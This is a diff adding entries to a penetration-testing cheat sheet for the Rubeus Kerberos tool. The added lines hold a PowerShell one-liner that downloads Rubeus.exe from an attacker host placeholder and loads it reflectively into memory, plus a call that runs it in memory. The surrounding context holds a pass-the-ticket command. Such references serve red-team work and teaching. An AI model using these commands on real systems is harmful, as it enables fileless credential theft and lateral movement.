@@ -8,6 +8,18 @@
 .\Rubeus.exe ptt /ticket:<ticket>
 ```
 
+## load rubeus from powershell
+#plateform/windows #target/local #cat/UTILS 
+```powershell
+$data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);
+```
+
+## execute rubeus from powershell
+#plateform/windows #target/remote #cat/UTILS 
+```powershell
+[Rubeus.Program]::MainString("klist");
+```
+
 ## monitor
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
